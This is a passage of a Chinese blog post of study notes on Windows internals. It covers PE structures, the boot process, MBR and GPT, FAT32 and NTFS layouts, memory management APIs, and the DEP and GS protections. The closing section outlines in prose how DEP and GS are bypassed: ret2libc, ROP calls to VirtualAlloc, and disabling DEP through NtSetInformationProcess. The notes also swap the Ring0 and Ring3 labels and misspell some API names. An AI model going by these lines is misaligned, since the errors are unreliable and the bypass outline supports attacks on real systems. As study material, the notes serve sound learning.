+</code></pre>
+<pre><code class="c++">typedef struct _IMAGE_THUNK_DATA32 &#123;
+    union &#123;
+        DWORD ForwarderString;      // PBYTE 
+        DWORD Function;             // PDWORD
+        DWORD Ordinal;
+        DWORD AddressOfData;        // PIMAGE_IMPORT_BY_NAME
+    &#125; u1;//双字最高位是1时，函数是以序号形式导入的，此时的低位就是函数序号
+    //最高位是0时，函数以字符串形式导入，此时双字=RVA地址，指向一个IMAGE_IMPORT_BY_NAME
+&#125; IMAGE_THUNK_DATA32;
+typedef IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;
+
+typedef struct _IMAGE_IMPORT_BY_NAME &#123;
+    WORD    Hint;		//表示函数的序号
+    CHAR   Name[1];		//导入函数的名称字符串
+&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;
+</code></pre>
+</li>
+<li><p>已初始化数据节.data：编译时已经固定值的数据</p>
+</li>
+<li><p>未初始化数据节.bss：未初始化的全局变量和静态变量</p>
+</li>
+<li><p>资源节.rsrc或.rdata：程序要用到的资源，树形结构</p>
+</li>
+<li><p>重定位信息段.reloc：存放重定位信息</p>
+<pre><code class="c++">typedef struct _IMAGE_BASE_RELOCATION &#123;
+    DWORD   VirtualAddress;		//重定位数据开始的RVA地址
+    DWORD   SizeOfBlock;		//重定位块大小
+//  WORD    TypeOffset[1];		//重定向位数组，即地址偏移，大小不定
+&#125; IMAGE_BASE_RELOCATION;
+typedef IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION;
+</code></pre>
+</li>
+</ol>
+</li>
+</ul>
+<h3 id="0x04-Win引导"><a href="#0x04-Win引导" class="headerlink" title="0x04.Win引导"></a>0x04.Win引导</h3><p>首先了解各大致过程：电源开启—&gt;分区引导（MBR）—&gt;操作系统引导（NTLDR&#x2F;Bootmgr）—&gt;文件系统引导（DBR，每个卷&#x2F;盘&#x2F;区可以有不同的文件系统）；下面的介绍均以windows为例子</p>
+<p><strong>硬盘结构</strong>：</p>
+<ul>
+<li><p>CHS寻址：借助3D参数，磁头0-255、柱面0-1023、扇区1-63</p>
+<blockquote>
+<p>3D参数：磁头数head（8位）、柱面数&#x2F;磁道号cylinders（10位）、扇区数sectors（6位，每个扇区512字节）</p>
+</blockquote>
+</li>
+<li><p>Int 13H调用：BIOS提供的基本功能，用于磁盘的复位、读写、校验、定位、诊断、格式化等，使用上述CHS寻址；</p>
+</li>
+<li><p>LBA寻址：将所有的扇区统一编号，从0开始；该地址为线性地址，由地址翻译器（硬件）将前面所述物理地址转换到此；同时也扩展了Int 13H，将其8G的限制突破</p>
+<blockquote>
+<p>LBA地址&#x3D;当前柱面号×255×63+当前磁头号×63+（当前扇区数-1）；因为不存在C&#x2F;H&#x2F;S&#x3D;0&#x2F;0&#x2F;0，所以最后减一</p>
+</blockquote>
+</li>
+</ul>
+<hr>
+<p><strong>Legacy BIOS引导模式</strong>：</p>
+<p>使用MBR磁盘格式，系统只能在MBR格式磁盘上；这里以win的启动为例；过程如下：</p>
+<ol>
+<li><p>通电电压不稳，主板发送RESET信号给CPU，稳定后不在发送。CPU执行0xFFFF0h处指令，此处为BIOS程序</p>
+</li>
+<li><p>BIOS执行，进行POST（加电自检）木有问题后加载第一个扇区（MBR）到内存0x7c00h处</p>
+</li>
+<li><p>执行MBR，查找第一个活动分区，并将其第一个扇区（PBR）加载到内存</p>
+</li>
+<li><p>执行PBR，跳过BPB到可执行代码处NTLDR</p>
+<blockquote>
+<p>BPB:即BIOS参数记录块，描述能够使可执行引导代码找到相关参数的信息。记录着本分区的起始扇区、结束扇区、文件存储格式、硬盘介质描述符、根目录大小、FAT 个数,分配单元的大小等重要参数。</p>
+</blockquote>
+</li>
+<li><p>PBR读取VBR（卷引导记录，用于告诉计算机OS在分区里的位置）；CPU跳转执行bootmgr代码</p>
+</li>
+<li><p>寻找BootMGR，木有则寻找ntldr（在win 8之后默认bootmgr）</p>
+</li>
+<li><p>执行bootmgr，读取BCD文件，如果有多个系统则列举供选择</p>
+</li>
+<li><p>选择win则加载winload.exe到内存，CPU执行，并读取\windows\bootstat.dat；接着加载内核程序Ntoskrnl.exe，将CPU执行权交给内核</p>
+</li>
+<li><p>内核程序初始化完成</p>
+</li>
+</ol>
+<p><strong>MBR分区模式</strong>：</p>
+<p>包括：主引导记录MBR（开机必读）、硬盘主分区表DPT、引导扇区标记boot record ID；</p>
+<ul>
+<li><p>MBR：占前446字节，存放着系统主引导程序，位于磁盘0柱面、0磁头、1扇区</p>
+</li>
+<li><p>DPT：占64字节，记录磁盘基本分区，一共包含4个分区项，每项16字节；</p>
+<blockquote>
+<p>1B分区状态—3B起始磁头号+起始扇区+柱面号—1B分区类型（识别主分区还是扩展分区）—3B分区结束磁头号+扇区+柱面号—1D本分区之前已经占用的扇区数—1D本分区占用总扇区数</p>
+</blockquote>
+</li>
+<li><p>Boot record ID：占2字节，合法的话就&#x3D;0xAA55</p>
+</li>
+<li><p>扩展分区：正常情况下按照DPT项数只有4个分区，为了更多分区扩展，在每个逻辑盘前都有上述结构，其中的第一项存放当前逻辑盘的地址，第二项存放的是下一个逻辑盘前的引导记录等，最后两项为空。</p>
+</li>
+<li><p>最多只能识别2TB、最多4个主分区或3主分区+1扩展分区；</p>
+</li>
+</ul>
+<hr>
+<p><strong>UEFI BIOS引导模式</strong>：</p>
+<p>win7支持，win8默认，使用GPT磁盘格式，没有自检过程；</p>
+<p>阶段 &#x3D; SEC（安全验证）—PEI（EFI前期初始化）—DXE（驱动执行环境）—BDS（启动设备选择）—TSL（操作系统加载前期）—RT（系统运行阶段）—AL（关机或系统恢复）</p>
+<ol>
+<li>同上进行通电，但CPU执行UEFI指令，并进行相关设备的初始化</li>
+<li>查找EFI分区（FAT32格式，不一定是第一个分区，其中包含系统引导的关键数据程序）</li>
+<li>加载<code>\Boot\EFI\bootmgfw.efi</code>（专用于引导windows的引导文件）</li>
+<li>读取BCD文件，其中包含多个系统的信息，可供用户选择</li>
+<li>后面同上</li>
+</ol>
+<p><strong>GPT分区模式</strong>：</p>
+<p>全局唯一标识分区表，是可扩展固件接口EFI标准的一部分，用于代替MBR</p>
+<p>包括&#x3D;保护MBR+GPT头+分区表+分区区域+分区表备份+GPT头备份</p>
+<ul>
+<li><p>保护MBR：存放了一份传统MBR（1扇区），防止不支持GPT的管理工具破坏硬盘。在这个MBR中只有一个标识为0xEE的分区（也没有引导程序等，只有一个DPT、结束标志和磁盘签名），来表明该硬盘使用GPT分区表</p>
+<blockquote>
+<p>0x07普通分区、0x27恢复分区、0xEE该扇区为PMBR</p>
+</blockquote>
+</li>
+<li><p>GPT头：用于记录分区表的信息，下面仅列出部分重要信息</p>
+<blockquote>
+<p>0x0C-4B-GPT头字节总数、0x18-8B-GPT头所在扇区号、0x48-8B-分区表起始扇区号、0x50-4B-分区表项数、0x54-4B-每个分区表项数字节数</p>
+</blockquote>
+</li>
+<li><p>分区表：2-33号扇区，共可容纳128个分区表项，每个表项128B</p>
+<blockquote>
+<p>0x20-8B-分区起始地址、0x28-8B-分区结束地址</p>
+</blockquote>
+</li>
+<li><p>每个分区最多1EB&#x3D;1048576TB空间、支持128个主分区、分区表大小不固定</p>
+</li>
+</ul>
+<h3 id="0x05-文件系统"><a href="#0x05-文件系统" class="headerlink" title="0x05.文件系统"></a>0x05.文件系统</h3><p>文件系统是让OS可以管理的一种文件集合。</p>
+<ul>
+<li>分类包括：扩展文件系统（Ext）、新技术文件系统（NTFS）、文件分配表（FAT）、光盘文件系统（CDFS）、高性能文件系统（HPFS）等。</li>
+<li>内容包括：文件系统数据、内容（具体文件）、元数据（文件信息）、文件名、应用程序等</li>
+</ul>
+<p>在win下常用簇作为单位，扇区sector &lt; 簇Cluster：4KB，为单位分配空间，即占用空间，其内部的未使用叫内部碎片，外部碎片是介于两个簇之间但 &lt; 4KB的未使用的空间。</p>
+<blockquote>
+<p>松弛&#x2F;文件残留空间：指的是文件最后一个数据单元中未使用的字节；<br>卷松弛：文件系统末端和其占用的分区末端之间有空</p>
+</blockquote>
+<p>分配簇&#x2F;文件空间的算法主要有：</p>
+<ul>
+<li>连续分配：文件连续存储</li>
+<li>链式分配：指针指向下一簇，必须连着读</li>
+<li>索引分配：所有位置的指针都写入一个索引块中</li>
+</ul>
+<p>Windows支持的文件系统有：FAT12、FAT16、<strong>FAT32</strong>、<strong>NTFS</strong>、WINFS等。Linux支持Ext2、Ext3、Minix、NTFS等。</p>
+<h4 id="FAT32"><a href="#FAT32" class="headerlink" title="FAT32"></a>FAT32</h4><p>FAT32即文件分配表FAT表项大小为32位，exFAT的表项大小64位；采用链式分配法管理已经分配或未分配的簇；</p>
+<p>所有版本的FAT布局相同：物理盘划分为&#x3D;引导区—文件分配表区（FAT区）—数据区（DATA区），前两者合称为系统区</p>
+<ul>
+<li><p>引导区：从头开始占用三个扇区，其中保存了物理盘每扇区的字节数、每一簇对应的扇区数以及引导记录等；其后面还有部分留白扇区（0x24以后的内容会根据版本号有区别，这里以FAT32为例子）；FAT16只占用1个扇区，而且后面没有留白</p>
+<p>在FAT32中，引导区&#x3D;DBR+保留分区；下面是分区引导区的内容（只有部分较为重要内容）</p>
+<blockquote>
+<p>DBR：Dos Boot Record即分区引导扇区，用于引导操作系统引导程序的一部分，用于加载文件系统元数据</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>字节位置</th>
+<th>内容</th>
+<th>字节位置</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0x00-0x02</td>
+<td>汇编指令跳转引导代码EB 58 90</td>
+<td>0x03-0x0a</td>
+<td>文件系统版本</td>
+</tr>
+<tr>
+<td>0x0b-0x0c</td>
+<td>每扇区的字节数</td>
+<td>0x0d</td>
+<td>每簇的扇区数</td>
+</tr>
+<tr>
+<td>0xe-0xf</td>
+<td>FAT表相对起始扇区号</td>
+<td>0x10</td>
+<td>FAT表个数（一般是2，用于备份）</td>
+</tr>
+<tr>
+<td>0x15</td>
+<td>介质描述符，0xf8表示固定磁盘，0xf0表示可移动磁盘</td>
+<td>0x18-0x19</td>
+<td>每磁道扇区数</td>
+</tr>
+<tr>
+<td>0x1a-0x1b</td>
+<td>磁头数</td>
+<td>0x24-0x27</td>
+<td>FAT表的扇区数</td>
+</tr>
+<tr>
+<td>0x30-0x31</td>
+<td>DBR大小</td>
+<td>0x32-0x33</td>
+<td>引导扇区的备份扇区号</td>
+</tr>
+<tr>
+<td>0x52-0x59</td>
+<td>FAT文件系统类型</td>
+<td>0x5a-0x1fd</td>
+<td>未使用，但可以包含OS启动代码</td>
+</tr>
+<tr>
+<td>0x1fe-0x1ff</td>
+<td>0xAA55结束标志</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+</li>
+<li><p>FAT区：由两个相同的FAT表构成，用于备份，其中包含了文件占用的簇链、空闲空间等；FAT中每个簇都有一个表项，例如三号表项就对应的3号簇；表项记录如下（注意虽然是32位，但高4位保留，FAT16&#x3D;0002H-FEFFH个可用簇号）：</p>
+<ul>
+<li>未使用&#x2F;空闲的簇：0x0000</li>
+<li>损坏的簇：-9或0xffffff7</li>
+<li>文件下一个簇的地址</li>
+<li>文件最后一个簇或文件结束标志：-1或0x0fffffff</li>
+</ul>
+</li>
+<li><p>根目录区（ROOT区）：属于数据区的一部分；在FAT32中区域、大小都不固定，而在FAT12&#x2F;16中，固定在FAT区之后的32个扇区，最多可以存放512（32*16）个目录项；根目录下的任何文件或者子目录都会有一个根目录表项，一般位于第二簇（数据区才开始有簇！）</p>
+</li>
+<li><p>目录区：属于数据区，一个目录项占32字节。以表的形式存在，又叫做目录表—DIR（Directory_Table）或文件目录表—FDT（File_Directory_Table）每个表项对应一个文件或者子目录相关信息（在FAT中文件和文件夹处理方式相同）</p>
+<blockquote>
+<p> 子目录项的最后一项为0；长文件名的需要用长文件名（LFN）目录项来存储；文件属性一项最高两位不用：0x01只读、0x02隐藏文件、0x04系统文件、0x08包含磁盘卷标签的表项、0x10子目录表项、0x20归档文件</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>位置</th>
+<th>说明</th>
+<th>位置</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>00-07</td>
+<td>文件正名</td>
+<td>08-0A</td>
+<td>扩展名</td>
+</tr>
+<tr>
+<td>0B</td>
+<td>文件属性(按二进制分)</td>
+<td>0C</td>
+<td>保留</td>
+</tr>
+<tr>
+<td>0D-0F</td>
+<td>文件创建时间，24位</td>
+<td>10-11</td>
+<td>16位创建时间，相对于1980年</td>
+</tr>
+<tr>
+<td>12-13</td>
+<td>16位最近访问时间</td>
+<td>14-15</td>
+<td>起始簇号的高16位</td>
+</tr>
+<tr>
+<td>16-17</td>
+<td>16位最新修改时间</td>
+<td>18-19</td>
+<td>16位最新修改时间，相对1980</td>
+</tr>
+<tr>
+<td>1A-1B</td>
+<td>起始簇号低16位</td>
+<td>1C-1F</td>
+<td>文件字节长度</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<blockquote>
+<p>下面是LFN表项的具体内容，同样32字节，一个长文件名文件可能有多个该表项；文件名以Unicode格式保存，且占2字节</p>
+<table>
+<thead>
+<tr>
+<th>位置</th>
+<th>内容</th>
+<th>位置</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0x0</td>
+<td>序列号</td>
+<td>0x1-0xa</td>
+<td>长文件名的5个文件名字符</td>
+</tr>
+<tr>
+<td>0xb</td>
+<td>长文件名属性，LFN&#x3D;0x0F</td>
+<td>0xc</td>
+<td>保留</td>
+</tr>
+<tr>
+<td>0xd</td>
+<td>校验和，根据短文件名算出</td>
+<td>0xe-0x19</td>
+<td>长文件名的6个文件名字符</td>
+</tr>
+<tr>
+<td>0x1a-0x1b</td>
+<td>保留</td>
+<td>0x1c-0x1f</td>
+<td>长文件名的2个文件名字符</td>
+</tr>
+</tbody></table>
+<p>其中序列号从1起，若是最后则与’0x40’进行或运算并填入，若对应文件&#x2F;目录被删记为’0xE5’</p>
+</blockquote>
+<p><img src="https://img1.imgtp.com/2023/10/07/v7gijBNO.png" alt="image-20231007161407234"></p>
+<h4 id="NTFS"><a href="#NTFS" class="headerlink" title="NTFS"></a>NTFS</h4><p>win_xp之后首选文件系统，使用B+树来组织目录项，解决了FAT的磁盘大小限制、空间利用率以及文件名长度等问题。NTFS具体内容太过麻烦，这里仅作部分说明</p>
+<blockquote>
+<p>同样用簇为单位，但是稍有区别，在NTFS中有逻辑簇号LCN与虚拟簇号VCN之分，前者是实际上占的簇号，后者是本文件的第几个簇号</p>
+</blockquote>
+<p>NTFS使用NTFS Log记录详细的事务日志，跟踪卷的文件系统的元数据变化（人话：有相关文件记录元数据）。</p>
+<p>格式：1个引导扇区+15个扇区的NTLDR区域+MFT分配空间+文件存储区+MFT前几个数据文件的备份+文件存储区</p>
+<ul>
+<li><p>引导扇区：包含引导程序和BPB参数（用于定位后面的NTLDR区），格式与FAT的分区引导区相似</p>
+<table>
+<thead>
+<tr>
+<th>字节偏移</th>
+<th>内容</th>
+<th>字节偏移</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0x00</td>
+<td>JMP指令</td>
+<td>0x03</td>
+<td>OEM标识‘NTFS’</td>
+</tr>
+<tr>
+<td>0x0B</td>
+<td>每扇区字节数</td>
+<td>0x0D</td>
+<td>每簇扇区数</td>
+</tr>
+<tr>
+<td>0x0E</td>
+<td>保留扇区数</td>
+<td>0x10</td>
+<td>0</td>
+</tr>
+<tr>
+<td>0x15</td>
+<td>介质描述符</td>
+<td>0x16</td>
+<td>0</td>
+</tr>
+<tr>
+<td>0x18</td>
+<td>每磁道扇区数</td>
+<td>0x1A</td>
+<td>磁头数</td>
+</tr>
+<tr>
+<td>0x1C</td>
+<td>隐藏扇区数</td>
+<td>0x20</td>
+<td>0</td>
+</tr>
+<tr>
+<td>0x28</td>
+<td>总扇区数</td>
+<td>0x30</td>
+<td><code>$MFT</code>簇号</td>
+</tr>
+<tr>
+<td>0x38</td>
+<td><code>$MFTMirr</code>簇号</td>
+<td>0x40</td>
+<td>文件记录段字节数</td>
+</tr>
+<tr>
+<td>0x41</td>
+<td>0</td>
+<td>0x44</td>
+<td>索引缓冲簇数</td>
+</tr>
+<tr>
+<td>0x45</td>
+<td>0</td>
+<td>0x48</td>
+<td>卷序列数</td>
+</tr>
+<tr>
+<td>0x50</td>
+<td>校验和</td>
+<td>0x54</td>
+<td>启动指令码</td>
+</tr>
+<tr>
+<td>0x01FE</td>
+<td>0xAA55结束标志</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+</li>
+<li><p>NTLDR区：引导程序的一部分（与NTFS没有必要联系，以前多用该程序来启动加载windows）</p>
+</li>
+<li><p><strong>主控文件表MFT</strong>：包含卷中所有的信息，以数组实现，每个文件记录项大小1KB，一个文件至少一项。</p>
+<p>在这个表中的前16项位置固定，且有备份，后面才存放每个文件或目录对应的MFT项；以<code>$</code>符开头，0-11如下，12-15保留。</p>
+<table>
+<thead>
+<tr>
+<th>文件名</th>
+<th>描述</th>
+<th>文件名</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>$MFT</code></td>
+<td>主文件表</td>
+<td><code>$MFTMirr</code></td>
+<td>主文件表前几项的备份</td>
+</tr>
+<tr>
+<td><code>$LogFile</code></td>
+<td>日志文件，记录元数据变化</td>
+<td><code>$Volumn</code></td>
+<td>卷文件</td>
+</tr>
+<tr>
+<td><code>$AttrDef</code></td>
+<td>属性定义列表</td>
+<td><code>$Root</code></td>
+<td>根目录文件</td>
+</tr>
+<tr>
+<td><code>$Bitmap</code></td>
+<td>位图文件，每位对应1簇，1有0未</td>
+<td><code>$Boot</code></td>
+<td>引导文件，包含DBR扇区</td>
+</tr>
+<tr>
+<td><code>$BadClus</code></td>
+<td>坏簇记录文件</td>
+<td><code>$Secure</code></td>
+<td>文件安全属性与访问控制</td>
+</tr>
+<tr>
+<td><code>$UpCase</code></td>
+<td>大小写字符转换表文件</td>
+<td><code>$Extend</code></td>
+<td>扩展属性</td>
+</tr>
+</tbody></table>
+<p>对于每一个表项，大多以’FILE‘（4B）开头，以0xFF FF FF FF结束；表项&#x3D;MFT头+属性</p>
+<p>每一个文件&#x2F;MFT表项有对应的64位文件引用地址&#x3D;16位序列号（见下表，放高位）+ 48位文件地址（也可以说是表项序号，从0递增，放低位），对于较大文件的属性除了MFT外，还有一个扩展区域来存放多余的内容。</p>
+<table>
+<thead>
+<tr>
+<th>字节偏移</th>
+<th>内容</th>
+<th>字节偏移</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0-3</td>
+<td>MFT标志(好的‘FILE’，坏的‘BAAD’)</td>
+<td>4-5</td>
+<td>更新序列号</td>
+</tr>
+<tr>
+<td>6-7</td>
+<td>更新序列号的大小与数组</td>
+<td>8-15</td>
+<td>日志文件序列号</td>
+</tr>
+<tr>
+<td>16-17</td>
+<td>序列号</td>
+<td>18-19</td>
+<td>硬连接数</td>
+</tr>
+<tr>
+<td>20-21</td>
+<td>第一个属性的偏移地址</td>
+<td>22-23</td>
+<td>标志00表删除-01正在使用-02目录被删-03目录正在使用</td>
+</tr>
+<tr>
+<td>24-27</td>
+<td>文件记录的实际长度</td>
+<td>28-31</td>
+<td>文件记录的分配长度</td>
+</tr>
+<tr>
+<td>32-39</td>
+<td>基本文件记录中的文件索引号</td>
+<td>40-41</td>
+<td>下一个属性ID</td>
+</tr>
+<tr>
+<td>42-43</td>
+<td>边界</td>
+<td>44-47</td>
+<td>文件记录参考号</td>
+</tr>
+<tr>
+<td>48-1023</td>
+<td>属性和固定值</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>属性分为两部分，属性头+属性体（属性内容）。属性头描述了是常驻属性（属性内容存在MFT中）还是非常驻属性（存在文件区），其属性体数据结构不同。非常驻属性的内容叫做数据流，流的大小不一，其第一个字节的低4位表示流大小的字节数，高4位表示包含流的起始簇地址的字节数。属性头格式如下：</p>
+<table>
+<thead>
+<tr>
+<th>字节偏移</th>
+<th>内容</th>
+<th>字节偏移</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0-3</td>
+<td>属性类型</td>
+<td>4-7</td>
+<td>属性长度</td>
+</tr>
+<tr>
+<td>8</td>
+<td>0常驻，1非常驻</td>
+<td>9</td>
+<td>属性名长度</td>
+</tr>
+<tr>
+<td>10-11</td>
+<td>属性名的开始偏移</td>
+<td>12-13</td>
+<td>标志</td>
+</tr>
+<tr>
+<td>14-15</td>
+<td>属性ID</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>对于常驻属性：16-19为属性体大小，20-21为属性体的偏移。非常驻属性这里不再过多叙述</p>
+</li>
+</ul>
+<h3 id="0x06-Windows内存结构与管理"><a href="#0x06-Windows内存结构与管理" class="headerlink" title="0x06. Windows内存结构与管理"></a>0x06. Windows内存结构与管理</h3><p><strong>DOS内存布局</strong>：运行于实模式中，寻址范围只有1MB。</p>
+<table>
+<thead>
+<tr>
+<th>地址</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>F0000-FFFFF</td>
+<td>ROM BIOS</td>
+</tr>
+<tr>
+<td>A0000-F0000</td>
+<td>设备保留区</td>
+</tr>
+<tr>
+<td>400-4F0、4F0-500、500-700</td>
+<td>BIOS、用户、DOS通信区</td>
+</tr>
+<tr>
+<td>0-400</td>
+<td>中断向量表</td>
+</tr>
+</tbody></table>
+<p><strong>Windows内存布局</strong>：</p>
+<p>开机后一般运行于保护模式下，这就使得每个32位进程都拥有4GB的虚拟内存寻址空间，且会根据OS版本对虚拟内存空间进行划分，下面是x86下32win的虚拟内存大致分布情况</p>
+<ul>
+<li><p>FFFFFFFF-80000000&#x3D;2GB（内核模式分区）：操作系统使用，不可读写；其中的数据所有进程共享，但被保护</p>
+<blockquote>
+<p>Ring0（用户模式）-Ring3（内核模式）；Ring0仅限于用户模式区，后者可访问所有内存、硬件、使用所有处理器指令，但是对其代码空间不提供保护</p>
+</blockquote>
+</li>
+<li><p>7FFFFFFF-7FFF0000&#x3D;64KB（禁入分区）：防止跨系统或跨用户边界的传输数据，不可读写</p>
+</li>
+<li><p>7FFEFFFF-00010000（用户模式区）：进程私有空间</p>
+</li>
+<li><p>0-0000FFFF&#x3D;64KB（空指针赋值区）：用户捕捉NULL指针，不可读写；用来帮助程序员捕获对空指针的赋值</p>
+</li>
+</ul>
+<p><strong>虚拟地址转译</strong>：默认情况下x86上的windows使用二级页表，来将虚拟地址转换为物理地址，页表大小默认4KB；</p>
+<p>32位虚拟地址&#x3D;页目录索引+页表索引+字节索引（12bit）</p>
+<blockquote>
+<p>CR3寄存器页目录——页目录索引找到具体页目录项(PDE)——页表——根据页表索引找到页表项(PTE)——得到具体物理地址</p>
+</blockquote>
+<p><strong>内存分配与管理函数</strong>：内存API大致分三类有以下三类</p>
+<ul>
+<li><p>虚拟内存管理：适用于占用内存较大，但不一定立即用到的程序；能够提前分配一小部分内存，需要时就会从保留的内存块中再利用</p>
+<ol>
+<li>分配&#x2F;保留虚拟内存；参数：内存地址—大小—类型—保护标志</li>
+</ol>
+<pre><code class="c++">VirtualAlloc(IpMem,Size,Type,Access)
+//Ipmem可NULL,Size单位字节
+//Type类型MEM_COMMINT提交内存、MEM_RESERVE保留内存、MEM_TOP_DOWN尽可能在高地址分配内存
+//Access,PAGE_READONLY内存可读、PAGE_READWRITE可读可写
+</code></pre>
+<ol start="2">
+<li>释放虚拟内存；参数：地址—大小—类型</li>
+</ol>
+<pre><code class="c++">VirtualFREE(IpMem,Size,Type)
+//Type为释放的类型,MEM_DECOMMIT取消内存提交、MEM_RELEASE释放
+</code></pre>
+<ol start="3">
+<li>改变页保护属性；参数：地址—大小—类型—旧属性地址</li>
+</ol>
+<pre><code class="c++">VirtualProtect(IpMem,Size,Access,IpOldAccess)
+//前三者同上，最后是一个地址用来存放旧的保护属性
+</code></pre>
+<ol start="4">
+<li>内存锁定与解锁；</li>
+</ol>
+<pre><code class="c++">VirtualLock(IpMem,Size)		//确保进程运行时，指定内存总在内存中
+VirtualUnlock(IpMem,Size)	//
+</code></pre>
+</li>
+<li><p>堆管理：适用于经常需要分配小块内存的程序</p>
+<blockquote>
+<p>缺省堆：默认1MB，进程在编译时个已更改该值，在程序运行时如果需要使用临时内存则会从其中分配内存。Win32确保在任意时刻都只能有一个线程可以在缺省堆上分配释放内存</p>
+</blockquote>
+<ol>
+<li>创建新堆</li>
+</ol>
+<pre><code class="c++">HeapCreate(flOption,dWINitalSize,cbMaximumSize)
+//flOption可选：0、HEAP_NO_SERIALIZE、HEAP_GENERATE_EXCEPTIONS
+//后两者指出堆的初始化大小和最大容量，单位Byte，会自动对齐为页大小的整数倍
+</code></pre>
+<ol start="2">
+<li>分配堆内存&#x2F;重新分配堆内存</li>
+</ol>
+<pre><code class="c++">HeapAlloc(hHeap,dwFlags,dwBytes)
+//堆句柄，可由HeapCreate、GetProcessHeap取得
+//可选HEAP_ZERO_MEMORY(内存清0)、HEAP_GENERATE_EXCEPTIONS、HEAP_NO_SERIALIZE
+//要分配的堆内存大小
+HeapReAlloc(hHEAP,dwFlags,lpMem,dwBytes)
+//第三个参数指明内存堆地址
+</code></pre>
+<ol start="3">
+<li>释放堆内存</li>
+</ol>
+<pre><code class="c++">HeapFree(hHeap,dwFlags,lpMem)
+</code></pre>
+</li>
+<li><p>内存映射文件管理：简单说就是无需打开文件等操作，可以通过映射快速操纵文件内容</p>
+<p>相关API<code>CreateFileMapping()</code>、<code>MapViewOfFile()</code>、<code>UnmapViewOfFile()</code>、<code>FlushViewOfFile()</code></p>
+</li>
+</ul>
+<h3 id="0x07-Windows安全机制"><a href="#0x07-Windows安全机制" class="headerlink" title="0x07.Windows安全机制"></a>0x07.Windows安全机制</h3><p>相关位置在windows Defender中应用和浏览器控制下的攻击防护设置</p>
+<h4 id="数据执行保护DEP"><a href="#数据执行保护DEP" class="headerlink" title="数据执行保护DEP"></a>数据执行保护DEP</h4><p>通过使可写内存的不能执行，或者来让可执行内存不可写来消除威胁。常用于防范缓冲区溢出，其他叫法：NX&#x2F;XD&#x2F;WX；</p>
+<p>具体见<span class="exturl" data-url="aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL3poLWNuL3dpbmRvd3Mvd2luMzIvbWVtb3J5L2RhdGEtZXhlY3V0aW9uLXByZXZlbnRpb24=">数据执行保护 - Win32 apps | Microsoft Learn<i class="fa fa-external-link-alt"></i></span>；</p>
+<p>在Win中DEP相关设置如下：</p>
+<ul>
+<li>OptOut：除了手动添加到排除列表中的进程外，均开起了DEP保护；多用在Server中</li>
+<li>OptIn：仅应用于核心的系统可执行文件；多用于普通win</li>
+<li>AlwaysOn：对所有进程启用DEP保护，没有例外，不可关闭</li>
+<li>AlwaysOff：所有禁用，也不能被动态开启</li>
+</ul>
+<p>具体实现有两种模式：硬件实现和软件实现</p>
+<ul>
+<li>如果CPU支持内存页NX属性，则支持硬件实现，可通过Windows DEP tabsheet查看（桌面环境下高级系统设置-高级性能设置-数据执行保护）</li>
+<li>软件支持的DEP不能直接阻止在数据页上执行代码</li>
+</ul>
+<p><strong>对抗措施</strong>：通过执行已经加载的模块中的指令，或者是调用系统函数不受DEP的影响，但是使用的栈上的参数则是攻击者构造的。</p>
+<ul>
+<li><p>利用ret-to-libc执行命令或进行API调用，如WinExec等</p>
+<blockquote>
+<p>在库中找到一段执行系统命令的代码或函数，用这段代码的地址覆盖返回地址；参考<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vemhhbmcyOTMvcC85MDI2NTg3Lmh0bWw=">内存保护机制及绕过方法——利用Ret2Libc绕过DEP之ZwSetInformationProcess函数 - zhang293 - 博客园 (cnblogs.com)<i class="fa fa-external-link-alt"></i></span></p>
+</blockquote>
+</li>
+<li><p>将包含ShellCode的内存页面标记为可执行，在跳过去执行</p>
+</li>
+<li><p>分配可执行内存，再将ShellCode复制到其中，再跳进去执行</p>
+<blockquote>
+<p>需要使用ROP技术（能够连续调用已存在的程序代码，来创建一连串指令码序列）调用API函数WriteProcessMemory、HeapCreate、VirtualAlloc、memcopy实现</p>
+</blockquote>
+</li>
+<li><p>尝试关闭DEP再运行ShellCode</p>
+<blockquote>
+<p>一个进程的DEP开启标志保存在内核结构中（_KPROCESS），当DEP置用时ExecuteDisable被置位，禁用时ExecuteEnable被置位，当Permanent置位时表明这些设置不可更改。需要借助NtQueryInformationProcess()和NtSetInformationProcess()函数来设置ProcessExecuteFlags类。</p>
+</blockquote>
+</li>
+</ul>
+<h4 id="栈溢出检查GS"><a href="#栈溢出检查GS" class="headerlink" title="栈溢出检查GS"></a>栈溢出检查GS</h4><p>在VS中默认设置该选项</p>
+<p>原理：当程序启动时，会首先计算出该程序的cookie值（动态、4B），然后将其保存在加载模块的.data节中，如果函数被调用，那么该值就会被复制到栈中（retAd、EBP之后，局部变量之前），用于在函数结束时进行检查。此外他对栈中变量进行重新排序：对函数栈帧进行重排，将字符串缓冲区分配在栈帧的最高地址上、将函数参数复制到寄存器或栈缓冲区上，防止参数被溢出</p>
+<p>条件：当函数有字符串缓冲区（且&gt;&#x3D;5字节时）或使用_alloca函数在栈上分配空间时，编译器才在栈中保存该cookie值。</p>
+<p><strong>缺陷</strong>：</p>
+<ul>
+<li>一个函数中含有多个缓冲区时，都放在同一个栈里面，可以从一个缓冲区溢出到另一个缓冲区</li>
+<li>对于参数数量不确定的函数来说，预先不知道函数参数的个数，因此无法进行保护</li>
+<li>alloca()函数动态分配的缓冲区不可避免地放在栈顶</li>
